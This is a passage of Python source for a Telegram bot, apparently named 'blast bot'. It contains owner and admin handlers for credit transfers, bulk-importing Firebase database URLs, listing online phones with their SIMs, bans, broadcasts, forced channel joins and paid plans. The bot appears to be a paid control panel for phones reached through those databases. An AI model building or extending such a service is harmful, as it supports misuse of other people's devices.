            target_uid,
            f"{em(EMOJI_MONEY, '💸')} <b>Credits Received!</b>\n\n"
            f"{em(EMOJI_STAR, '👤')} Received from: <code>{uid}</code>\n"
            f"{em(EMOJI_MONEY, '💰')} Amount: <b>{amount}</b> credits\n"
            f"{em(EMOJI_MONEY, '💳')} New Balance: <b>{get_user_credits(target_uid, d)}</b>",
            parse_mode="HTML"
        )
    except: pass

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Transfer Successful!</b>\n\n"
        f"{em(EMOJI_STAR, '👤')} To: <code>{target_uid}</code>\n"
        f"{em(EMOJI_MONEY, '💰')} Amount: <b>{amount}</b> credits\n"
        f"{em(EMOJI_MONEY, '💳')} Your Balance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([(f"{sc('home')}", "user:home")]),
        parse_mode="HTML"
    )


@R.callback_query(F.data.in_({"owner:home", "owner:refresh"}))
async def owner_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data.startswith("owner:fb:menu"))
async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
        return
    await state.clear()
    
    parts = cq.data.split(":")
    page = int(parts[3]) if len(parts) > 3 else 0

    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\nTotal: <b>{len(d.get('firebases', []))}</b> firebase(s)",
        reply_markup=fb_menu_kb(d, page),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fb:add")
async def owner_fb_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_firebase)
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Add Single Firebase</b>\n\nFirebase URL bhejo:\n"
        f"<i>Format: Label | URL\nExample: MyApp | https://myapp.firebaseio.com</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")]),
        parse_mode="HTML"
    )

@R.message(S.add_firebase, F.text)
async def owner_fb_add_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    text = msg.text.strip()
    if "|" in text:
        parts = text.split("|", 1)
        label = parts[0].strip()
        url = parts[1].strip()
    else:
        url = text
        label = url.replace("https://", "").split(".")[0][:20]
    if not url.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} URL must start with https://. Dobara bhejo:", parse_mode="HTML")
        return
    url = url.rstrip("/")
    fbs = d.get("firebases", [])
    if any(fb["url"] == url for fb in fbs):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already added!", reply_markup=fb_menu_kb(d), parse_mode="HTML")
        return
    fb_id = str(int(time.time()))
    fbs.append({"id": fb_id, "url": url, "label": label, "added_at": int(time.time())})
    d["firebases"] = fbs
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Firebase Added!</b>\n\n{em(EMOJI_STAR, '🏷')} {label}\n{em(EMOJI_GEAR, '🔗')} <code>{url}</code>",
        reply_markup=fb_menu_kb(load()),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fb:add_file")
async def owner_fb_add_file_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_firebase_file)
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Bulk Add Firebase via TXT File</b>\n\n"
        f"Aap ek `.txt` file upload karein jisme Firebase URLs hon.\n\n"
        f"<b>Supported File Formats:</b>\n"
        f"• <code>https://myapp.firebaseio.com</code>\n"
        f"• <code>Label | https://myapp.firebaseio.com</code>\n\n"
        f"<i>Duplicate URLs auto-skip ho jayenge!</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")]),
        parse_mode="HTML"
    )

@R.message(S.add_firebase_file, F.document)
async def owner_fb_add_file_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return

    doc = msg.document
    if not doc.file_name.endswith('.txt'):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf `.txt` file bhejiyega!", parse_mode="HTML")
        return

    file_info = await msg.bot.get_file(doc.file_id)
    downloaded_file = await msg.bot.download_file(file_info.file_path)
    content = downloaded_file.read().decode('utf-8', errors='ignore')

    lines = content.splitlines()
    fbs = d.get("firebases", [])
    existing_urls = {fb["url"].rstrip("/") for fb in fbs}

    added_count = 0
    skipped_count = 0
    processed_in_file = set()

    for line in lines:
        line = line.strip()
        if not line:
            continue

        if "|" in line:
            parts = line.split("|", 1)
            label = parts[0].strip()
            url = parts[1].strip()
        else:
            url = line
            label = url.replace("https://", "").replace("http://", "").split(".")[0][:20]

        if not (url.startswith("http://") or url.startswith("https://")):
            continue

        url = url.rstrip("/")

        if url in existing_urls or url in processed_in_file:
            skipped_count += 1
            continue

        processed_in_file.add(url)
        existing_urls.add(url)
        fb_id = str(int(time.time() * 1000) + random.randint(100, 999))
        fbs.append({
            "id": fb_id,
            "url": url,
            "label": label,
            "added_at": int(time.time())
        })
        added_count += 1

    d["firebases"] = fbs
    save(d)
    await state.clear()

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Firebase TXT Processed!</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Successfully Added : <b>{added_count}</b>\n"
        f"{em(EMOJI_WARNING, '⚠️')} Skipped (Duplicates) : <b>{skipped_count}</b>\n"
        f"{em(EMOJI_STAR, '📊')} Total Firebase DBs  : <b>{len(fbs)}</b>",
        reply_markup=fb_menu_kb(load()),
        parse_mode="HTML"
    )

@R.message(S.add_firebase_file)
async def owner_fb_add_file_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Kripya ek valid `.txt` document file upload karein!", parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:fb:del:"))
async def owner_fb_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    parts = cq.data.split(":")
    fb_id = parts[3]
    page = int(parts[4]) if len(parts) > 4 else 0

    d["firebases"] = [fb for fb in d["firebases"] if fb["id"] != fb_id]
    save(d)
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") != fb_id]
    FB_DEVICE_COUNTS.pop(fb_id, None)
    await safe_answer(cq, "🗑 Removed!")
    d = load()
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\nTotal: <b>{len(d['firebases'])}</b>",
        reply_markup=fb_menu_kb(d, page),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:stats")
async def owner_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await safe_answer(cq, "⏳ Fetching...")

    current_fb_ids = {fb["id"] for fb in d.get("firebases", [])}
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]
    stale = [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]
    for k in stale:
        FB_DEVICE_COUNTS.pop(k, None)

    devices = get_cached_devices()
    if not devices:
        ensure_scan_running()
        devices = []

    stats_text = api_stats_text(d)
    dev_lines = [f"\n{em(EMOJI_CHECK, '🟢')} <b>Online Devices ({len(devices)})</b>\n"]
    if not devices:
        dev_lines.append(f"  {em(EMOJI_WARNING, '😴')} Koi device online nahi — {em(EMOJI_GEAR, '🔄')} scan background mein chal raha hai (~3-4 min)")
    for dv in devices:
        dev_lines.append(
            f"  {em(EMOJI_PHONE, '📱')} <b>{dv['dev_name'][:20]}</b>\n"
            f"     {em(EMOJI_FIRE, '🔥')} {dv['fb_label'][:25]}\n"
            f"     {em(EMOJI_STAR, '📶')} SIMs: {len(dv['sims']) or 1}"
        )
    full = stats_text + "\n" + "\n".join(dev_lines)

    if len(full) > 4000:
        full = full[:3990] + "\n<i>...truncated</i>"

    await cq.message.edit_text(
        full,
        reply_markup=kb([
            (f"{sc('refresh')}", "owner:stats"),
            (f"{sc('back')}", "owner:home")
        ]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:owners:menu")
async def owner_owners_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    owners = d.get("owners", [])
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Super Admins</b>\n\nTotal: <b>{len(owners)}/6</b>",
        reply_markup=owners_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:owners:add")
async def owner_owners_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    if len(d.get("owners", [])) >= 6:
        await safe_answer(cq, "❌ Max 6!", show_alert=True)
        return
    await state.set_state(S.add_owner)
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Add Super Admin</b>\n\nSuper Admin Chat ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:owners:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_owner, F.text)
async def owner_owners_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        new_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid Chat ID bhejo.", parse_mode="HTML")
        return
    if is_owner(new_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already super admin!", reply_markup=owners_menu_kb(d), parse_mode="HTML")
        return
    if len(d.get("owners", [])) >= 6:
        await state.clear()
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Max 6!", reply_markup=owners_menu_kb(d), parse_mode="HTML")
        return
    d["owners"].append(new_id)
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Super Admin Added!</b>\n<code>{new_id}</code>",
        reply_markup=owners_menu_kb(load()),
        parse_mode="HTML"
    )
    try:
        await msg.bot.send_message(new_id, f"{em(EMOJI_CROWN, '🔱')} <b>Aapko Super Admin bana diya gaya!</b>\n/start karein.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.startswith("owner:owners:del:"))
async def owner_owners_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    del_id = int(cq.data.split("owner:owners:del:", 1)[1])
    if not is_owner(uid, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    if del_id == MAIN_OWNER or del_id in SUPER_ADMINS:
        await safe_answer(cq, "❌ Main owner / Hardcoded Super Admin remove nahi ho sakta!", show_alert=True)
        return
    if del_id in d["owners"]:
        d["owners"].remove(del_id)
        save(d)
        await safe_answer(cq, "🗑 Removed!")
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Owners</b>\n\nTotal: <b>{len(d['owners'])}/6</b>",
        reply_markup=owners_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:admins:menu")
async def owner_admins_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    admins = d.get("admins", [])
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b>\n\nTotal: <b>{len(admins)}</b>",
        reply_markup=admins_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:admins:add")
async def owner_admins_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_admin)
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Add Admin</b>\n\nTelegram User ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:admins:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_admin, F.text)
async def owner_admins_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        new_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML")
        return
    if new_id in d.get("admins", []) or is_owner(new_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already admin/owner!", reply_markup=admins_menu_kb(d), parse_mode="HTML")
        return
    d["admins"].append(new_id)
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Admin Added!</b>\n<code>{new_id}</code>",
        reply_markup=admins_menu_kb(load()),
        parse_mode="HTML"
    )
    try:
        await msg.bot.send_message(new_id, f"{em(EMOJI_SHIELD, '🛡')} <b>Aapko Admin bana diya gaya!</b>\n/start karein.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.startswith("owner:admins:del:"))
async def owner_admins_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    del_id = int(cq.data.split("owner:admins:del:", 1)[1])
    if not is_owner(uid, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    if del_id in d.get("admins", []):
        d["admins"].remove(del_id)
        save(d)
        await safe_answer(cq, "🗑 Removed!")
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b>\n\nTotal: <b>{len(d['admins'])}</b>",
        reply_markup=admins_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"owner:free:on", "owner:free:off"}))
async def owner_free_toggle(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    d["free_mode"] = (cq.data == "owner:free:on")
    save(d)
    d = load()
    mode = "🟢 FREE MODE ON" if d["free_mode"] else "🔴 Approval Required"
    await safe_answer(cq, f"Done! {mode}", show_alert=True)
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest: pass

@R.callback_query(F.data.in_({"owner:users:list", "admin:users:list"}))
async def panel_users_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    prefix = "owner" if is_owner(uid, d) else "admin"
    if not is_admin(uid, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    text, markup = users_list_kb(d, prefix, 0)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data.regexp(r"^(owner|admin):users:pg:(\d+)$"))
async def panel_users_page(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    parts = cq.data.split(":")
    prefix = parts[0]
    page = int(parts[3])
    text, markup = users_list_kb(d, prefix, page)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data.in_({"owner:ban", "admin:ban"}))
async def panel_ban_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.ban_user)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🚫')} <b>Ban User</b>\n\nUser ka Telegram ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", back)]),
        parse_mode="HTML"
    )

@R.message(S.ban_user, F.text)
async def panel_ban_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    try:
        ban_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML")
        return
    if is_owner(ban_id, d) or is_admin(ban_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Admin/Owner ko ban nahi kar sakte!", parse_mode="HTML")
        return
    if ban_id not in d.get("banned", []):
        d.setdefault("banned", []).append(ban_id)
        save(d)
    await state.clear()
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(
        f"{em(EMOJI_CROSS, '🚫')} <b>Ban ho gaya!</b>\n<code>{ban_id}</code>",
        reply_markup=back_kb,
        parse_mode="HTML"
    )
    try:
        await msg.bot.send_message(ban_id, f"{em(EMOJI_CROSS, '🚫')} Aapko ban kar diya gaya. Admin se contact karein.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.in_({"owner:unban:menu", "admin:unban:menu"}))
async def panel_unban_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    banned = d.get("banned", [])
    if not banned:
        await safe_answer(cq, "✅ Koi banned nahi!", show_alert=True)
        return
    prefix = "owner" if is_owner(cq.from_user.id, d) else "admin"
    await cq.message.edit_text(
        f"{em(EMOJI_CHECK, '🔓')} <b>Unban User</b>\n\nBanned: <b>{len(banned)}</b>",
        reply_markup=unban_menu_kb(d, prefix),
        parse_mode="HTML"
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):unban:do:(\d+)$"))
async def panel_unban_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    ban_id = int(cq.data.split(":")[-1])
    if ban_id in d.get("banned", []):
        d["banned"].remove(ban_id)
        save(d)
    await safe_answer(cq, f"✅ {ban_id} unban ho gaya!", show_alert=True)
    back_text = owner_panel_text(d) if is_owner(uid, d) else admin_panel_text(d)
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await cq.message.edit_text(back_text, reply_markup=back_kb, parse_mode="HTML")
    try:
        await cq.bot.send_message(ban_id, f"{em(EMOJI_CHECK, '✅')} Aapka ban hata diya gaya. /start karein.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.in_({"owner:broadcast", "admin:broadcast"}))
async def panel_broadcast_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.broadcast)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await cq.message.edit_text(
        f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\nJo message bhejni hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", back)]),
        parse_mode="HTML"
    )

@R.message(S.broadcast)
async def panel_broadcast_do(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    await state.clear()
    users = d.get("users", {})
    wait = await msg.answer(f"{em(EMOJI_BELL, '📤')} Broadcasting to <b>{len(users)}</b> users...", parse_mode="HTML")
    ok = 0
    fail = 0
    for uid_str in users:
        try:
            target = int(uid_str)
            if msg.text:
                bcast_text = f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\n{msg.text}"
                await msg.bot.send_message(target, bcast_text, parse_mode="HTML")
            else:
                await msg.copy_to(target)
            ok += 1
        except Exception:
            fail += 1
        await asyncio.sleep(0.05)
    await wait.delete()
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Broadcast Done!</b>\n\n{em(EMOJI_CHECK, '✅')} Delivered: <b>{ok}</b>\n{em(EMOJI_CROSS, '❌')} Failed: <b>{fail}</b>",
        reply_markup=back_kb,
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:export_script")
async def owner_export_script(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await safe_answer(cq, "📤 Exporting...")
    try:
        script_path = os.path.abspath(__file__)
        if not os.path.exists(script_path):
            script_path = _DATA_FILE.replace(".json", ".py")
            if not os.path.exists(script_path):
                script_path = "blast_bot_v3.2_premium.py"
        await cq.message.reply_document(
            document=FSInputFile(script_path),
            caption=f"{em(EMOJI_GEAR, '📤')} <b>Script Export</b> — <i>{_VERSION}</i>",
            parse_mode="HTML"
        )
    except Exception as e:
        await safe_answer(cq, f"❌ Export failed: {str(e)[:40]}", show_alert=True)

@R.callback_query(F.data.in_({"admin:home", "admin:refresh"}))
async def admin_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Admin Only!", show_alert=True)
        return
    try:
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    except TelegramBadRequest: pass

@R.callback_query(F.data == "admin:stats")
async def admin_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Admin Only!", show_alert=True)
        return
    await safe_answer(cq, "⏳ Fetching...")

    current_fb_ids = {fb["id"] for fb in d.get("firebases", [])}
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]
    stale = [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]
    for k in stale:
        FB_DEVICE_COUNTS.pop(k, None)

    devices = get_cached_devices()
    if not devices:
        ensure_scan_running()
        devices = []

    stats_text = api_stats_text(d)
    dev_lines = [f"\n{em(EMOJI_CHECK, '🟢')} <b>Online Devices ({len(devices)})</b>\n"]
    if not devices:
        dev_lines.append(f"  {em(EMOJI_WARNING, '😴')} Koi device online nahi — {em(EMOJI_GEAR, '🔄')} scan background mein chal raha hai (~3-4 min)")
    for dv in devices:
        dev_lines.append(f"  {em(EMOJI_PHONE, '📱')} <b>{dv['dev_name'][:20]}</b> — {em(EMOJI_FIRE, '🔥')} {dv['fb_label'][:20]}")
    full = stats_text + "\n" + "\n".join(dev_lines)

    if len(full) > 4000:
        full = full[:3990] + "\n<i>...truncated</i>"

    await cq.message.edit_text(
        full,
        reply_markup=kb([
            (f"{sc('refresh')}", "admin:stats"),
            (f"{sc('back')}", "admin:home")
        ]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fj:menu")
async def owner_fj_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    fj = d.get("force_join", {})
    channels = fj.get("channels", [])
    status = f"{em(EMOJI_CHECK, '🟢')} ON" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} OFF"

    text = f"{em(EMOJI_BELL, '🔗')} <b>Force Join Settings</b>\n\nStatus: {status}\nChannels: <b>{len(channels)}</b>\n\n"
    for ch in channels:
        req = f"{em(EMOJI_CHECK, '✅')} Required" if ch.get("required", True) else f"{em(EMOJI_CROSS, '❌')} Optional"
        text += f"• {ch.get('title', 'Channel')} (<code>{ch['id']}</code>)\n  {req} | {ch['link']}\n\n"

    rows = [
        [btn("ᴀᴅᴅ ᴄʜᴀɴɴᴇʟ", "owner:fj:add", EMOJI_CHECK, "➕")],
        [btn("ʀᴇᴍᴏᴠᴇ ᴄʜᴀɴɴᴇʟ", "owner:fj:remove", EMOJI_CROSS, "🗑")],
        [InlineKeyboardButton(
            text=f"🟢 {sc('enable')}" if not fj.get("enabled") else f"🔴 {sc('disable')}",
            callback_data="owner:fj:toggle"
        )],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:fj:add")
async def owner_fj_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.fj_add_channel)
    await cq.message.edit_text(
        f"{em(EMOJI_BELL, '🔗')} <b>Add Force Join Channel</b>\n\n"
        f"{sc('step 1/2')}: Channel/Group ka Telegram ID bhejo:\n"
        f"<i>Example: -1001234567890</i>\n\n"
        f"<b>Note:</b> Bot ko us channel/group mein admin hona chahiye.",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fj:menu")]),
        parse_mode="HTML"
    )

@R.message(S.fj_add_channel, F.text)
async def owner_fj_add_channel(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        ch_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid channel ID bhejo (numbers only, e.g. -100xxx).", parse_mode="HTML")
        return
    await state.update_data(fj_channel_id=ch_id)
    await state.set_state(S.fj_add_link)
    await msg.answer(
        f"{em(EMOJI_BELL, '🔗')} <b>{sc('step 2/2')}</b>\n\n"
        f"Channel/Group ka invite link bhejo:\n"
        f"<i>Example: https://t.me/+AbCdEfGhIjK</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fj:menu")]),
        parse_mode="HTML"
    )

@R.message(S.fj_add_link, F.text)
async def owner_fj_add_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid link bhejo (https:// se start hona chahiye).", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    ch_id = str(fsmd.get("fj_channel_id"))

    try:
        chat = await msg.bot.get_chat(int(ch_id))
        title = chat.title or "Channel"
    except:
        title = "Channel"

    channels = d.setdefault("force_join", {}).setdefault("channels", [])
    channels = [c for c in channels if str(c["id"]) != ch_id]
    channels.append({"id": ch_id, "link": link, "title": title, "required": True})
    d["force_join"]["channels"] = channels
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Channel Added!</b>\n\n{em(EMOJI_BELL, '📢')} {title}\n{em(EMOJI_GEAR, '🔗')} {link}",
        reply_markup=kb([(f"{sc('back')}", "owner:fj:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fj:remove")
async def owner_fj_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    channels = d.get("force_join", {}).get("channels", [])
    if not channels:
        await safe_answer(cq, "❌ Koi channel nahi hai!", show_alert=True)
        return

    rows = []
    for ch in channels:
        rows.append([btn(f"{ch.get('title', 'Channel')[:25]}", f"owner:fj:del:{ch['id']}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:fj:menu", EMOJI_GEAR, "🔙")])

    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🗑')} <b>Remove Channel</b>\n\nKaunsa channel hataana hai?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:fj:del:"))
async def owner_fj_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    ch_id = cq.data.split("owner:fj:del:", 1)[1]
    channels = d.get("force_join", {}).get("channels", [])
    d["force_join"]["channels"] = [c for c in channels if str(c["id"]) != ch_id]
    save(d)
    await safe_answer(cq, "🗑 Channel removed!")
    await owner_fj_menu(cq, state)

@R.callback_query(F.data == "owner:fj:toggle")
async def owner_fj_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    fj = d.setdefault("force_join", {})
    fj["enabled"] = not fj.get("enabled", False)
    save(d)
    status = "ENABLED" if fj["enabled"] else "DISABLED"
    await safe_answer(cq, f"Force Join {status}!", show_alert=True)
    await owner_fj_menu(cq, state)

@R.callback_query(F.data == "owner:pricing:menu")
async def owner_pricing_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    plans = d.get("pricing", {}).get("plans", [])

    text = f"{em(EMOJI_MONEY, '💳')} <b>Pricing Plans</b>\n\nTotal Plans: <b>{len(plans)}</b>\n\n"
    for i, plan in enumerate(plans, 1):
        text += f"{i}. <b>{plan['name']}</b>\n   {em(EMOJI_MONEY, '💰')} {plan['price']} {plan.get('currency', 'INR')} = {plan['credits']} credits\n   {em(EMOJI_GEAR, '🔗')} {plan['payment_link']}\n\n"

    rows = [
